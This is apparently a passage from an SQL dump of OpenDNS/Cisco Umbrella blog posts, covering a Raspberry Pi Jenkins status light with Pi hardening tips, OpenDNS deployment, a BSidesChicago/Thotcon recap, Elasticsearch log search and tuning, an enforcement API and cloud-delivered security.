/home/pi/jenkins_status_light.py --jenkins-url https://jenkins.server.com --job job-name\nautostart=true\nautorestart=true\nstderr_logfile=/var/log/jenkins_status_light.err.log\nstdout_logfile=/var/log/jenkins_status_light.out.log\nOnce you’ve saved that file then as the root user you can inform Supervisor of our new file:\nsupervisorctl reread\nThen update with those changes:\nsupervisorctl update\nTo control Supervisor you can use the following commands:\nsudo service supervisor stop / start / restart\nTo monitor stdout of our py file output:\ntail -f /var/log/jenkins_status_light.out.log\nThere’s also an interactive mode that is worth reading about.\nSecuring the Pi\nThe Raspberry Pi is a full fledged computer and it’s only as secure as you make it. Here’s a list of some things to do to increase the security of your device:\nThe first thing you should absolutely do is change the default password. You can test the strength of your password with Steve Gibson’s password haystack. The higher the entropy the better.\nMake sure everything is up to date. We did this with apt-get update and apt-get upgrade above.\nEnabling unattended security updates which can help avoid “0-day exploits”.\nChange the default user account to something other than ‘pi’ (Note that root is disabled by default on Raspbian which is great)\nClose all services and ports you don’t use.\nDon’t let untrusted people near it. It’s simple to plug a malicious device into it to gain control.\nDon’t make the Pi publicly available on the internet unless you know what you’re doing. It’s best to sit behind your NAT router with DMZ disabled and behind a firewall if you have one (there’s one built into Linux, but it can be difficult to manage).\nConsider using IP tables to only allow specific IP addresses or IP ranges to connect to your device.\nSetup Fail2ban to block suspicious SSH connections who make too many failed attempts attempts against the device. This will provide a 10 minute ban for anyone who has 3 unsuccessful login attempts:\n\n\n$ sudo apt-get install fail2ban\nNote that some things such as “changing the ssh port” while not bad, will only get you so far. “Security through obscurity” won’t do much but slow down a determined hacker.\nProject improvements\nUsing a queue means lights don’t always update immediately, esp. if build times are very short\nDaemonizing threads and being able to cleanly exit the script would be great\nSometimes the light will quickly flash a past build color before updating to the correct color\nHave the script automatically determine how many LED strips exist\nTry creating a moving ‘progress bar’ animation to display estimated build duration.\nSince this was 24-hour hackathon project I’m sure there are plenty of code improvements to be made. Please feel free to fork and submit changes and improvements! We’d love to see your own projects and what you did with this!

Time saved by not cleaning machines, chasing down users, or other arduous tasks is time that can be spent identifying infections and protecting the network from threats both internal and external.\nFor security professionals in particular, the philosophy of efficiency is baked into their every action, from custom APIs to automated filtering to traffic analysis tools…the list goes on. With so many adversaries and technical challenges facing security professionals, anything that can be automated or otherwise simplified means extra time for more meaningful tasks.\nDeploying those tools should be simple as well. The ability to have protection up and running on a network without a significant time investment is essential when every second counts. At OpenDNS, we strive to make our products “easy to deploy, and simple to manage,” and there are a few simple steps customers can take to ensure that mantra holds true from the minute a contract is signed:\n\nUpdate Forwarders\nOpenDNS Insights can be applied in layers to roll out security while minimizing user impact. The quickest win is also one of the first steps in deploying the product: point the forwarders on your internal DNS server to our Anycast IPs (208.67.222.222/208.67.220.220).\nBy pointing the forwarders to these addresses (instead of the virtual appliances), protection goes into effect immediately, even before VAs need to be deployed, and without making changes directly affecting client machines. Although lacking identity-level granularity, this step allows administrators to ensure blanket protection for their networks until they can set up the VA.\n\nDeploy the OpenDNS Virtual Appliance\nAlthough the topic of deploying two OpenDNS virtual appliances was addressed previously, the topic is worthy of repetition. Our VA gives administrators deeper reporting granularity and provides insight into a network by mapping internal IP addresses to AD (active directory) users and computers. It also forwards external DNS queries from a network to the OpenDNS Global Network.\nAnd it’s not enough to deploy one VA. Doubling down on deployment ensures uptime during upgrades and updates—without a second VA, any upgrades would result in 20 minutes of downtime. Another benefit of deploying multiple VAs is high availability. As Marcus Ranum said, “One person’s ‘paranoia’ is another person’s ‘engineering redundancy.’ ”\n\nIntegrate Domain Controllers and Active Directory\nDeploying the VA is also a prerequisite for rolling out the Insights AD integration piece. The other two crucial components necessary are registering the network’s domain controllers and deploying the AD Connector. The Connector monitors DCs, listening to user and computer logins and enabling IP-to-user and IP-to-computer mappings on the VAs, essentially tying network and AD events to a human actor or an endpoint. The Connector also assists in importing AD users, groups, and computers to the Umbrella dashboard to provide these mappings.\nWithout these components, the integration will not work properly—and security administrators lose out on the rich data that would otherwise populate the dashboard. Speaking of efficiency, the granular visibility of the AD integration allows security teams to pinpoint problematic users or machines, and remediate infections quicker. It also offers admins the chance to create custom policies for specific users or groups within an organization.\n\nThese three actions can be rolled out separately, allowing for a testing phase to ensure the product is deployed with the least amount of impact on end users. Potential issues during any step of the process can be addressed immediately, saving time and administrative overhead, while still allowing for general network protection.\nUpdate. Deploy. Integrate. Efficient, indeed.\nFor any issues that may arise during deployment, our support team can be reached directly via the dashboard or on twitter.', 'Blog;Uncategorized', 'https://umbrella.cisco.com/blog/2015/05/21/the-philosophy-of-efficiency-make-the-most-of-your-insights-deployment/');

We were both privileged enough to be accepted to speak at BSidesChicago which, for an event that almost didn’t happen, was the best BSidesChicago we’ve attended.\nBSidesChicago\nAK:\nI was finally able to speak about the results I discovered from DGA seed bruteforcing research I previously blogged about here. Botnet command and control architectures were discussed while DGA backends were focused on, Ramnit and its DGA were described, the algorithm I used to identify all Ramnit C2 domain names was presented, and finally some interesting query plots and client IPv4 graphs where explained. The slide deck for my presentation is available for download here.\nFollowing Bruce Potter (the creator of ShmooCon) was a definite challenge, but the crowd was very receptive and asked many thought provoking questions.\nJosh:\nNicholas Percoco, from Rapid 7 and the founder of Thotcon, spoke to the crowd on the ‘Security of Things’. He explained his love of thinking about the future and detailed his interest in the direction of technology since a young age. As a child, he was enamored by the futuristic Epcot ride, Horizons. Nicholas verbally recreated a future version of this ride to describe the sort of future we might be in for and some of the risks we might encounter based on the current direction of technology. Examples involved self-driving cars that are hacked and crashed, robotic hospitals misdiagnosing patients and brain to computer interfaces which are compromised by hacktivists, requiring large payments to decrypt memories or unscramble thoughts.\nIt was pretty difficult to speak after Nicholas, but I did my best by presenting a variation of my talk about protecting a cloud server with a cloud IDS. This is a topic I’ve been explaining at several other recent conferences, providing additional research into different aspects of the topic at each opportunity. At BSides Chicago, I dug deeper into the use of compromised domains in phishing attacks and their attribution to specific hosting providers as a reason someone might want to view attack activity against their shared web host.\nRichard Wartell, from CounterTack, gave an entertaining technical presentation titled, ‘The Life and Times of an APT Malware Author’. Using a potential scenario combined with malware he has analyzed or created during work engagements, he walked us through the most common thought processes and mistakes of malware authors. Richard concluded with some basic suggestions for malware authors if they want to avoid detection or make the job of a reverse engineer more challenging.\nThe final presentation of the day was by Runa Sandvik. It was titled, ‘Encrypt like Everyone’s Watching’. She gave an introduction to the workings of Tor and the various mobile applications available for securing communications. Her talk began by addressing the common argument of, “I’ve got nothing to hide”, used by some when considering surveillance of their communications and activities. Runa suggested that everyone use applications to promote secure communication, making it more of a normal behavior. This would result in a decrease in the targeting of smaller groups or individual users of these applications. She followed with a description of the functionality of tools such as the Tails operating system, Tor browser and applications like Orbot, Redphone and Textsecure on Android and Signal on iPhone. The latter portion of her time on stage involved multiple questions, resulting in thoughtful dialogue on privacy topics.\nThere were so many other great presentations that we just couldn’t get to, such as ‘Trusts You Might Have Missed’, by Will Schroeder and Justin Warner, ‘Pentesting is Broken’ by Zach Grace,  ‘Malvertisements, The Modern Targeted Attack” by Adrian Evans, ‘Evasion Techniques of Elusive Hax0rs’ by Jaeson Schultz and a two hour workshop on using Bro IDS by Liam Randall.\nThotcon\nAK:\nThe “A-side” to the Bsides event was Thotcon. It occurred the Thursday and Friday before BSidesChicago. Now in its sixth year, with each occurrence this conference gets better and better. As with most conferences, the biggest benefit comes from networking and socializing; I tend to call these “hallway conversations”. These are where you get to see people’s true personalities, reactions, and thoughts which are often not as transparent over infosec practitioners typical communication medium of choice (email and chat rooms).\nBetween excellent conversations were top-notch presentations. The second keynote titled “Wanna Cyber?” by Tod Beardsley and egypt of the Metasploit project surfaced interesting questions such as “If we enter a cyberwar, what is a cyberwar crime?” and “As typical cyber operations require multiple people working together, who should be charged with cyberwar crimes?” I look forward to attending again next year.', 'Events;Security Research', 'https://umbrella.cisco.com/blog/2015/05/21/bsideschicago-and-thotcon-2015/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1353, 'Elasticsearch: You Know, For Logs [Part 4]', 'OpenDNS Engineering', 'May 19, 2015', 'Part 4: Advanced Options\nPart 3 of this series explores searching and sorting log data in Elasticsearch and how to best configure Elasticsearch for these operations.\nThis post will focus on some other options in Elasticsearch for speeding up indexing and searching as well as saving on storage that didn’t have a place in any of the three previous posts. Some of these options come with trade offs and are not recommended in all cases.\nBulk Indexing\nIndexing documents one at a time is inefficient, especially with small documents like log files. To speed up indexing, use the Elasticsearch Bulk API. The Bulk API allows documents to be indexed in batches instead of individually, greatly increasing indexing speed.\nBulk indexing using the REST API is fairly straight forward. Following this schema given by Elastic:\naction_and_meta_datan\r\noptional_sourcen\r\naction_and_meta_datan\r\noptional_sourcen\r\n....\nA Bulk request will look like:\ncurl -XPOST \'http://localhost:9200/_bulk\' -d \'{\r\n{ \"index\" : { \"_index\" : \"logs\", \"_type\" : \"log\" } }\r\n{ \"Timestamp\" : \"2009-11-15T14:12:12\", \"URL\" : \"opendns.com\", \"IP Address\" : \"127.0.0.1\", \"log_id\" : 1}\r\n{ \"index\" : { \"_index\" : \"logs\", \"_type\" : \"log\" } }\r\n{ \"Timestamp\" : \"2009-11-15T14:12:13\", \"URL\" : \"opendns.com/enterprise-security\", \"IP Address\" : \"127.0.0.1\", \"log_id\" : 2}\r\n{ \"index\" : { \"_index\" : \"logs\", \"_type\" : \"log\" } }\r\n{ \"Timestamp\" : \"2009-11-15T14:12:13\", \"URL\" : \"opendns.com/about\", \"IP Address\" : \"127.0.0.1\", \"log_id\" : 3}\r\n}\'\nA couple important configurations need to be set when using the Bulk API. Firstly, bulk requests should be done in batches of a specific size in order to optimize throughput. A batch size of Two-thousand five hundred is a good first guess; Elasticsearch suggests anywhere from 1000 to 5000.\nSecondly, the Bulk API can drop documents if the Bulk Queue Size is set too low. If this happens the following remote transport exception will be thrown:\nRemoteTransportException[[<>][inet[/127.0.0.1:9300]][bulk/shard]]; nested: EsRejectedExecutionException[rejected execution (queue capacity 50) on org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1@1234];\nThe threadpool.bulk.queue_size must be increased until this error is no longer thrown. The default value is 50; Increasing it to 1000 in Elasticsearch’s configuration(elasticsearch.yml) should solve the problem for most clusters:\nthreadpool.bulk.queue_size: 1000\nRouting\nElasticsearch allows the ability to ensure related documents are all stored on the same shard using the routing feature. If a routing key is given to a document, Elasticsearch will read the key and route the document to the shard that contains other documents with the same key.\nExample:\ncurl -XPOST \'http://localhost:9200/logs/log?routing=com\' -d \'{\r\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\r\n    \"URL\" : \"opendns.com/about\",\r\n    \"TLD\" : \"com\",\r\n    \"IP Address\" : \"127.0.0.1\"\r\n}\'\nIndexing a document with the command above will ensure it resides in the same shard as all other documents with the “com” routing key.\nThe routing path can be derived from the document itself in the mapping, similar to how the ID path is specified, for example:\n$ curl -XPUT \'http://localhost:9200/logs/_mapping/log\' -d \'\r\n{\r\n  \"log\" : {\r\n          \"_routing\" : {\"path\" : \"TLD\"},\r\n         \"_id\" : {\"path\" : \"log_id\"},\r\n        \"properties\" : {\r\n           \"Timestamp\" : {\"type\" : \"date\"},\r\n                \"URL\" : {\"type\" : \"string\",\r\n                                \"index\": \"not_analyzed\"},\r\n                \"TLD\" : {\"type\" : \"string\",\r\n                                \"index\": \"not_analyzed\"},\r\n           \"IP Address\" : {\"type\": \"ip\"},\r\n         \"log_id\" : {\"type\" : \"string\",\r\n                     \"index\" : \"not_analyzed\"}\r\n        }\r\n    }\r\n}\'\nThis mapping will route log documents by their “TLD” field.\nRouting Advantages\nThe advantages of routing documents comes when it is time to execute search requests. When searching for documents with the same routing key, Elasticsearch knows exactly which shard the documents reside in and thus only has to send the search request to said shard.\nWithout Routing:\n\nWith Routing:\n\nSince Elasticsearch only has to query a single shard, query response time will decrease significantly. Another added benefit is the nodes that don’t contain the target shard will not have to process any search request at all, thus saving valuable CPU cycles.\nThe benefits of routing documents increase with the number of shards in a cluster. Small clusters with under 50 shards will likely only see a small speed increase. Though as a cluster grows and approaches 200+ shards, the benefits of routing become more apparent:\n\nTo perform routed queries, simply include the routing key in the search request:\ncurl -XGET localhost:9200/_search?routing=com -d \'\r\n{\r\n  \"query\": {\r\n    \"filtered\": {\r\n      \"filter\": {\r\n        \"term\": { \"URL\": { \"opendns.com\" }}\r\n      }\r\n    }\r\n  }\r\n}\r\n\'\n\nRouting Disadvantages\nOne of the benefits of letting Elasticsearch control the routing, is documents will be uniformly spread across all shards in an index. Once user-determined routing is introduced, this uniformity is lost since every document with the same routing key must exist in the same shard. This can cause certain shards to be far larger than others, and as a result can cause nodes to be “hot spotted” by common routing values, stressing the CPU and eating through storage.\nFor example, say we decided to route DNS logs by TLDs. This might work great for smaller TLDs such as “.gov” and “.edu.” But what happens if all “.com” and “.org” logs get routed to the same shard? The node containing said shard will receive far more traffic than the other nodes, just because it got unlucky and happened to catch two large routing values.\nAfter introducing routing to our tests, we saw the following variations in CPU usage over our data nodes:\n\nThis graph shows the high volatility in CPU usage that routing can cause when there is variability in the traffic flowing to different routing keys.\nFurthermore, it is possible in some cases for routing to cause issues with storage. Say for example we have 2TB of “.com” DNS logs in an index but our instances only have 1TB of disk. All 2TB of data will attempt to be routed to a single instance, which will promptly run out of storage.\nFor further information on routing, Sematext gives a very informative presentation on scaling massive Elasticsearch clusters that talk in detail about routing and its advantages.\nOptimize\nWithin each Elasticsearch shard, there are several segments that get periodically merged as the segment count grows. Having multiple segments in a shard means search requests must search each segment individually, then aggregate and return the results. Having to aggregate the results means that having multiple segments per shard will slow down queries. By optimizing an index, Elasticsearch is merging every possible segment into a single segment to maximize query performance.\nRunning the following command will optimize an index down to a single segment:\n$ curl -XPOST \'http://localhost:9200/twitter/_optimize?max_num_segments=1\'\nNote that this is an operation that should only be performed on old indices. For example, when indexing logs by time period, it would be smart to optimize indices whose time frame has ended since they won’t be creating new indices. It might be pointless however to optimize the index responsible for the current time period since it is active and will be creating additional segments anyways.\nAlso, optimizing an index is a heavy duty operation that should only be performed when the cluster can handle it.\nFor more information on Elasticsearch segments and the optimize API visit this page.\n‘_all’ Field\nBy default Elasticsearch stores an ‘_all’ field for each document, which includes the contents of every field in the document. The _all field is meant to be searchable in the case where a user doesn’t want to specify the field names when searching. In most cases this functionality is not needed for log data, so it should be disabled to free up extra storage:\nBy adding the highlighted line to a PUT mapping request, the _all field will be disabled for documents of type “log” in index “logs”:\n$ curl -XPUT \'http://localhost:9200/logs/_mapping/log\' -d \'\r\n{\r\n    \"log\" : {\r\n          \"_all\" : {\"enabled\": false},\r\n        \"properties\" : {\r\n          \"Timestamp\" : {\"type\" : \"date\"},\r\n               \"URL\" : {\"type\" : \"string\",\r\n                              \"index\": \"not_analyzed\"},\r\n        \"IP Address\" : {\"type\": \"ip\"}\r\n          }\r\n     }\r\n}\r\n\'\n\nDisabling ‘_source’\nBy default Elasticsearch stores the source JSON for each document in the ‘_source’ field. When executing searches, Elasticsearch will simply return the _source field. The downside to storing the source is it adds a lot of extra storage overhead for each document. If storage is a concern, it is possible to disable the _source field and instead store each field value individually. This is done through the mapping API:\n$ curl -XPUT \'http://localhost:9200/logs/_mapping/log\' -d \'\r\n{\r\n  \"log\" : {\r\n          \"_source\" : {\"enabled\" : false},\r\n         \"_id\" : {\"path\" : \"log_id\"},\r\n       \"properties\" : {\r\n         \"Timestamp\" : {\"type\" : \"date\",\r\n                                 \"store\" : \"yes\"},\r\n              \"URL\" : {\"type\" : \"string\",\r\n                              \"index\" : \"not_analyzed\",\r\n                             \"store\" : \"yes\"},\r\n          \"IP Address\" : {\"type\" : \"ip\",\r\n                                 \"store\" : \"yes\"},\r\n        \"log_id\" : {\"type\" : \"string\",\r\n                     \"index\" : \"not_analyzed\"}\r\n        }\r\n    }\r\n}\'\nNotice that for each field you might want to be able to retrieve must have the {“store” : “yes”} clause.\nUsing this mapping will significantly reduce storage requirements, but it makes queries slightly more complex. Since Elasticsearch is no longer storing the source JSON, it will have to retrieve and aggregate the desired fields before returning. This can cause high Disk I/O and slower queries.\nThe following query will return the stored fields without needing a ‘_source’ JSON:\ncurl -XGET localhost:9200/_search -d \'\r\n{\r\n“fields” : [“Timestamp”, “URL”, “IP Address”],\r\n  \"query\": {\r\n    \"filtered\": {\r\n      \"filter\": {\r\n        \"term\": { \"URL\": { \"opendns.com\" }}\r\n      }\r\n    }\r\n  }\r\n}\r\n\'\n\nConclusion\nThis post was meant to demonstrate that Elasticsearch has several advanced features and configurations that can be used to customize a cluster for many different applications. Whether a cluster is being constrained by storage space, search speeds or indexing rates, Elasticsearch can accomodate. That said, there is still a plethora of cool features in Elasticsearch that were left out of this series.\nTo learn more about Elasticsearch, Elastic provides a highly detailed guide and has a very active community forum.', 'Security Engineering;Uncategorized', 'https://umbrella.cisco.com/blog/2015/05/19/elasticsearch-you-know-for-logs-part-4/');

Analysts need to know where to apply enforcement, and fast. Each minute matters when mitigating an attack. The problem is, because of the sheer volume of incoming alerts, combined with the amount of false positives, analysts are experiencing a frustrating amount of information overload.\nThe intelligence security professionals have at their disposal is what fuels the action to protect, prevent, and remediate attacks. But according to some industry analysts, intelligence enforcement is where the security industry is failing. John Oltsik, Senior Principal Analyst at ESG, wrote about this topic in a recent Network World article. According to Oltsik, the immaturity of threat intelligence causes security professionals to share info using methods that are fairly manual and antiquated.\n“Many [security] firms struggle with threat intelligence processing, correlation, and analytics, often depending upon homegrown tools in this area,” Oltsik said. “Security professionals complain that it is still quite difficult to operationalize threat intelligence programs so they can prioritize actions and measure success.”\nEnforcement APIs are becoming a crucial enabler to making this possible. According to CTO Dan Hubbard, this lack of enforcement is why OpenDNS launched a new enforcement API. “Security efficacy has started going down,” Hubbard said in an interview. “The challenge is how do you take intelligence to an actionable enforcement? Without that, you have to get your duct tape, glue, stapler, and fit it into all your other systems.”\nOpenDNS is expecting its new API to act as the missing enforcement arm of security intelligence. Since security teams are spending time aggregating their intelligence either through their own efforts or by using a product like a threat intelligence platform (TIP), those teams need a way of enforcing whatever intelligence they find actionable. According to OpenDNS Senior Product Manager Scott Cressman, security teams are currently relying on a very manual hodgepodge of systems to do this.\n“Companies build up a team of security analysts and end up being product developers for the frankensystem of tools they’re forced to create by munging together a host of intelligence systems,” Cressman said. “What this API provides is a way to enforce all the different types of intelligence and cover your entire network in seconds.”\nHow It Works\nThe cloud security provider has already released other APIs that provide information about events or domains and can allow changes to policies. The new enforcement API is also RESTful, and can ingest events formatted in the existing API documentation. Using these events, security analysts can create a useful telemetry feedback loop, Cressman added.\nPictured is a diagram of what this feedback loop would look like.\nRather than being yet another API that provides a source of intelligence, this new release is the plug that takes intelligence on one end, and pushes out enforcement on the other end. Depending on how it’s configured and what it finds, the API can then feed intelligence platforms and SIEMs logs and contextual information about malicious domains.\nAccording to the API’s documentation, an event can be added to the API following the proper format either through a custom script, a direct call, or through a partner integration like ThreatConnect or ThreatQuotient. If it successfully finds a domain, it can be fed to Security Graph to verify whether or not it is malicious.\nFrom there, it will either block that domain or allow it based on the security preferences already configured in the dashboard. This information can then be stored in Amazon S3 logs and fed back to a company’s SIEM for further analysis.\nHow to Get It\nAnnounced today, OpenDNS customers on the Investigate or Platform packages can make use of the new API functionality right away.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1356, 'Elasticsearch: You Know, For Logs [Part 3]', 'OpenDNS Engineering', 'May 12, 2015', 'Part 3: Searching and Sorting\nIn Part 2 of this series, Elasticsearch proved that it could be scaled up with relative ease using different instance roles in order to balance the workload. Additionally, Elasticsearch showed that, given proper setup and configuration, it can handle several different failure cases while maintaining high availability.\nThis post will focus on how to optimize searching and sorting in Elasticsearch for log data.\n\nLog Search\nBy default, Elasticsearch expects to be querying full text documents, not log data. As a result, Elasticsearch will score and sort each hit based on a relevancy factor since a single document could have more than one occurrence of the search term. This functionality can be avoided when searching log data by using a “‘filtered”’ query.\nFor example, the following query uses a filter that doesn’t score its hits:\ncurl -XGET localhost:9200/_search -d \'\r\n{\r\n\"size\" : 10,\r\n  \"query\": {\r\n    \"filtered\": {\r\n      \"filter\": {\r\n        \"term\": { \"URL\": \"opendns.com/enterprise-security\"}\r\n      }\r\n    }\r\n  }\r\n}\r\n\'\nThis query will return the first 10 documents matching the filter without having to score and sort each document.\n\nSorted Queries\nLogs often need to be returned in a sorted order. Since documents cannot be stored pre-sorted in Elasticsearch, sorting becomes a fairly challenging problem that can greatly slow down queries. Sorting is achieved in Elasticsearch by adding a “sort” clause to a query. Hits of a sorted query will not be scored.\nExample:\ncurl -XGET localhost:9200/_search -d \'\r\n{\r\n\"sort\" : [\r\n    { \"IP Address\" : {\"order\" : \"asc\"},\r\n     \"Timestamp\" : { \"order\" : \"desc\" }\r\n    }\r\n],\r\n  \"query\": {\r\n    \"filtered\": {\r\n      \"filter\": {\r\n        \"term\": { \"URL\": \"opendns.com/enterprise-security\"}\r\n      }\r\n    }\r\n  }\r\n}\r\n\'\nThe query above will return all logs with the URL field “opendns.com/enterprise-security,” sorted in ascending order by IP address. Then any logs with matching IP address fields are sorted in descending order by their timestamp field. Elasticsearch will not score any of the documents matching this query since a different sorting field is given.\nWithout proper configuration, a sorted query could result in a massive increase in response time. This is because no matter the size of your return set, every document that matches the query must be sorted. Even if only the top two documents are asked to be returned, Elasticsearch must sort every document that matches the query to actually determine the top two. This means that a query will have to sort the same number of values regardless of how many documents it actually returns.\nThe default sorting process in Elasticsearch is simple. If Elasticsearch is asked to return the top n hits of a sorted query, it will do the following:\nFirst each document that matches the query will be found as a “hit.”\nThen, for every hit, each shard loads all the data from the field to be sorted into memory.\nThe fields will then be sorted and the top n hits will be returned from each shard.\nThen, the top hits from each shard will be aggregated and re-sorted to ensure accuracy of the results for each index.\nThen, the top hit from each index will be aggregated and re-sorted to ensure accuracy of the final results.\nFinally the top n hits from the cluster are returned.\nThis process is slow and unavoidable, but Elasticsearch has a some options to speed it up.\n\nField Data\nElasticsearch stores all the values of the fields to be sorted on in its Field Data Cache. The problem is pulling field data into the cache at the time of the request is a heavy operation since all this data is read from disk. This behavior can be avoided by maintaining a “Field Data Cache.”\nFortunately, Elasticsearch allows field data to be loaded into the cache at the indexing stage by “eagerly” loading the field data. For example, the following template will eagerly load timestamp data for all type ‘log’ documents in “dnslog-*’ indices:\ncurl -XPUT localhost:9200/_template/dnslog_template -d \'\r\n{\r\n    \"template\" : \"dnslog-*\",\r\n    \"settings\" : {\r\n        \"number_of_shards\" : 3\r\n      \"number_of_replicas\": 1\r\n    },\r\n    \"mappings\" : {\r\n        \"log\" : {\r\n            \"properties\" : {\r\n                 \"Timestamp\" : {\"type\" : \"date\",\r\n                             \"fielddata\": {\r\n                                 \"loading\" : \"eager\"\r\n                                 }\r\n                            },\r\n                \"URL\" : {\"type\" : \"string\",\r\n                           \"index\": \"not_analyzed\"},\r\n                \"IP Address\" : {\"type\": \"ip\"}\r\n            }\r\n        }\r\n    }\r\n}\r\n\'\nThe size of the field data cache is configured by two variables in the elasticsearch.yml file:\nindices.fielddata.cache.expire: 1d\nindices.fielddata.cache.size: 25%\nEagerly loading field data can fill memory quickly if it isn’t controlled. These settings give you options for expiring and limiting field data. In most real time search applications, recent data will receive by far the most traffic. So setting the indices.fielddata.cache.expire to 1d will ensure recently indexed data can be sorted quickly, while also ensuring that field data from older data does not fill up memory. In the case where the field data cache does run out of memory, it will evict data using the Least Recently Used Algorithm if necessary.\n\nDoc Values\nAlthough using in-memory field data is the fastest way to sort, field data can consume a lot of memory. For large enough volumes of data, maintaining an in-memory field data cache may significantly slow down the application or simply be unfeasible. Luckily Elasticsearch provides an alternative to in-memory field data called “Doc Values”. Doc Values is a field data format, essentially the same as in-memory field data, except that it is stored on disk instead of in memory. Enabling Doc Values means more memory for other operations and less garbage collections while only causing a small increase in sorting speed (10-25% according to Elastic).\nDoc Values is enabled by changing the field data format to “doc_values” in the mapping for the field(s) that will be sorted on. For example:\n\"log\" : {\r\n            \"properties\" : {\r\n                 \"Timestamp\" : {\"type\" : \"date\",\r\n                              \"fielddata\": {\r\n                                 \"format\": \"doc_values\"\r\n                                 }\r\n                             },\r\n                 \"URL\" : {\"type\" : \"string\",\r\n                            \"index\": \"not_analyzed\"},\r\n                 \"IP Address\" : {\"type\": \"ip\"}\r\n            }\r\n        }\nOnce the field data format is set to “doc_values”, Elasticsearch will automatically store the field data on disk for each document when it is indexed. It will also automatically start using the on-disk field data for sorting.\n\nMinimize Sorting\nAnother option that can potentially reduce the response time of sorted queries is to take advantage of your index schema. For example if indices are partitioned by time period, such as by day or by hour, and results are being sorted on the Timestamp field, there is no need to sort every hit.  It is far more efficient to first query the most recent index, only moving on to the next index if the number of hits of the first query is smaller than the desired number of results. Applying this technique ensures the minimum number of fields are sorted.\nThis sorting technique is not supported by Elasticsearch itself and thus must be implemented by the Elasticsearch Client application. This can be done using a simple “for loop”, taking into account the total hits after each subsequent query. Here is an example using the Elasticsearch java API:\npublic List<Map<String, Object>> SortedQuery(Client c) throws Exception{\nInteger limit = 100;\r\n SearchResponse response;\r\n String index;\r\n List<Map<String, Object>> results = new ArrayList<Map<String,Object>>();\r\n DateTime time = new DateTime(System.currentTimeMillis());\nint hits;\r\n long totalHits;\nString indexPrefix = \"dns-test-\";\r\n String indexSuffix;\n// Build a simple query that filters on the \"URL\" field\r\n  AndFilterBuilder queryFilter =  FilterBuilders.andFilter();\r\n  queryFilter.add(FilterBuilders.termFilter(\"URL\",\r\n\"opendns.com/enterprise-security\"));\nwhile (limit > 0) {\n// Calculate which index to query using the prefix and suffix\r\n      indexSuffix = time.toString(\"yyyy-MM-dd-HH\");\r\n      index = indexPrefix + indexSuffix;\r\n\r\n      // Execute the query\r\n      response = c.prepareSearch(index)\r\n              .addSort(\"TimeStamp\", SortOrder.DESC)\r\n              .setSize(limit)\r\n              .setExplain(true)\r\n              .setPostFilter(queryFilter)\r\n              .execute()\r\n              .actionGet();\n// Get the number of hits\r\n      totalHits = response.getHits().getTotalHits();\r\n      hits = (int) totalHits;\r\n      if((long) hits != totalHits){\r\n         throw new Exception(\"Cannot convert from int to long\");\r\n      }\n// Add every hit to the result set\r\n      for (int i = 0; i < hits; i++) {\r\n          Map<String, Object> qResponse =\r\n                             response.getHits().getHits()[i].getSource();\r\n          results.add(qResponse);\r\n      }\n// Decrement time by one hour to follow an hourly index schema\r\n      if(hits < limit) {\r\n          time = time.minusHours(1);\r\n      }\n// if hits is equal to or greater than limit, return\r\n      else{\r\n          return results;\r\n      }\n// update the limit since we have already found some \"hits\"\r\n      limit = limit - hits;\r\n  }\r\n  return results;\r\n}\nThis function is meant to execute a sorted query on one index at a time in reverse chronological order, starting with the index corresponding to the current time. At the end of each loop, time is decremented by one hour in order to following an hourly index schema.\n\nConclusion\nElasticsearch has shown that it can be configured to competently search log data without wastefully scoring and sorting results. Additionally, by querying only the required indices and properly storing field data, Elasticsearch can return sorted queries fast and efficiently.\nIn Part 4 of this series, we will explore more advanced techniques and configuration in Elasticsearch that can take your cluster to the next level.\nContinue to: Elasticsearch: You Know, For Logs [Part 4].', 'Security Engineering;Uncategorized', 'https://umbrella.cisco.com/blog/2015/05/12/elasticsearch-you-know-for-logs-part-3/');

In Gizmodo, Adam Clark Estes writes that “[the] Cloud is a buzzword that vaguely suggests the promise and convenience of being able to access files from anywhere.”\nReplace “files” with “threat protection,” and what remains is a lukewarm definition of cloud-delivered security. However, there’s one enormous difference: cloud-delivered security has evolved in the past few years beyond a mere nice-to-have feature—it’s a burgeoning security model that’s disrupting the industry and making protection more accessible than ever.\nHowever, this again brings us to defining the cloud though through a security lens. What does “cloud-delivered security” actually mean?\nOne could say “cloud” solutions mean there’s no box on premises, and leave it at that. The box in this case would be a security appliance that sits in a company’s server room. But this definition would be limiting and not inclusive of the many shades of gray that exist in cloud security. As vendors jockey to separate themselves from competitors, the definition can become muddled beyond comprehension.\nIn the interest of brevity, security solutions can be separated into three categories: on-premises, hybrid cloud, and cloud. Most security professionals are familiar with on-premises solutions: there’s an appliance (again, an actual box) that sits on the network, protecting employees in a specific location. Updates, upgrades, and all other associated work are done in-house. In a hybrid cloud solution, part of that workload is given to the vendor—although there may be new hardware or software to install on-premises. Pure cloud solutions require no new hardware.\nCloud solutions also offer a host of advantages that extend, and work in tandem with, on-premise and hybrid solutions. The most important of which is transforming the traditional security model into something business applications have been for years: on demand.\nThe SaaS model has been wildly successful, as evidenced in companies such as Salesforce and Box. With Security as a Service, companies are able to take advantage of third-party infrastructure and intelligence to protect their networks without excessive administrative overhead. In a VentureBeat article, Meghan Kelly writes, “Unlike older security tools, like anti-virus software that needs to be installed on every single computer on your network, it’s almost plug and play—you click a button (and likely put in some credit card information) and suddenly you’ve got major security resources at your fingertips.”\nFor SMB administrators and busy enterprise SOCs alike, having an easily managed and consistent security service is essential. With a third-party vendor handling updates and constantly protecting against new threats globally, in real-time, security and IT professionals can spend less time patching and inevitably cleaning endpoint infections.\nAnother pressing issue for administrators is scaling security. With a cloud service, this issue disappears. The vendor shoulders the responsibility of building and maintaining the infrastructure. Even the fastest-growing startup or Fortune 500 company can deploy a solution within hours, compared to days. Demonstrating the ease of scale, Google–the quintessential tech industry mammoth–is putting cloud security into place. Google, it seems, understands the importance of not scaling past an appliance’s capacity.\nFinally, cloud-delivered security solutions offer the ability to protect endpoints anywhere in the world—an especially useful feature now that more people than ever are working remotely. According to Global Workplace Analytics in 2012, “2.6% of the U.S. employee workforce (3.3 million people, not including the self-employed or unpaid volunteers) considered home their primary place of work.” That number increases each year, and doesn’t factor in employees who travel for work, or mobile devices that access the network and company data. The ability to extend enterprise-grade protection to those workers while maintaining performance standards can only be done through cloud-delivered security, which makes it a valuable part of any security posture.\nAs the technology behind cloud-delivered 